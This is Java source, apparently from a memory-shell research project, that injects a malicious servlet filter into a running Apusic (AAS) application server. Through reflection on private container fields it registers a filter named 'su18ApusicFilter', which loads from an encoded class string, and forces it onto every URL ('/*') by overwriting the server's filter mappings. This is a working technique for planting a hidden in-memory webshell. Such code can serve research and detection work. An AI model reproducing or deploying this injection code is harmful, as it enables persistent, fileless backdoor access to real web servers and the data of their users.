package org.su18.memshell.test.apusic;

import com.apusic.deploy.runtime.FilterMapping;
import com.apusic.deploy.runtime.FilterModel;
import com.apusic.deploy.runtime.WebModule;
import com.apusic.web.container.WebContainer;

import javax.servlet.Filter;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Map;

import static org.su18.memshell.test.apusic.DynamicUtils.FILTER_CLASS_STRING;

/**
 * AAS ≈ GlassFish ，在其基础上稍微改改
 * 测试版本 AAS Enterprise Edition 9.0
 *
 * @author su18
 */
public class AddApusicFilter extends HttpServlet {

	@Override
	protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

		String       filterName = "su18ApusicFilter";
		WebContainer context    = (WebContainer) req.getServletContext();

		try {
			Field f = context.getClass().getDeclaredField("webapp");
			f.setAccessible(true);
			WebModule webapp = (WebModule) f.get(context);

			Class<?> filterClass = DynamicUtils.getClass(FILTER_CLASS_STRING);

			FilterModel model = new FilterModel(webapp);
			model.setFilterClass(filterClass.getName());
			model.setDisplayName(filterName);
			model.setInstance((Filter) filterClass.newInstance());
			model.setName(filterName);
			webapp.addFilter(model);

			Field f2 = webapp.getClass().getDeclaredField("filters");
			f2.setAccessible(true);
			Map<String, FilterModel> map = (Map<String, FilterModel>) f2.get(webapp);


			map.put(filterName, model);

			// 创建 FilterMap 对象
			FilterMapping filterMap = new FilterMapping();
			filterMap.setFilterName(filterName);
			filterMap.setUrlPattern("/*");
			filterMap.setServletName("IndexServlet");

			webapp.addFilterMapping(filterMap);


			Field f4 = context.getClass().getDeclaredField("filters");
			f4.setAccessible(true);
			Map<String, Object> mapp = (Map<String, Object>) f4.get(context);

			Class       c1          = Class.forName("com.apusic.web.container.FilterComponent");
			Constructor constructor = c1.getDeclaredConstructors()[0];
			constructor.setAccessible(true);

			mapp.put(filterName, constructor.newInstance(context, model));

			Field f3 = context.getClass().getDeclaredField("filterMapper");
			f3.setAccessible(true);
			Object mapper = f3.get(context);

			Class c  = Class.forName("com.apusic.web.container.FilterMapper");
			Field f5 = c.getDeclaredField("patternMappings");
			f5.setAccessible(true);
			Object[] mappings = (Object[]) f5.get(mapper);

			Class       c3           = Class.forName("com.apusic.web.container.FilterMapper$Mapping");
			Constructor constructor1 = c3.getDeclaredConstructors()[0];
			constructor1.setAccessible(true);
			Object o = constructor1.newInstance(filterName, 2);

			Method m = c3.getDeclaredMethod("setUrlPattern", String.class);
			m.setAccessible(true);
			m.invoke(o, "/*");

			mappings[0] = o;

			resp.getWriter().println("apusic filter added");

		} catch (Exception e) {
			e.printStackTrace();
		}

	}
}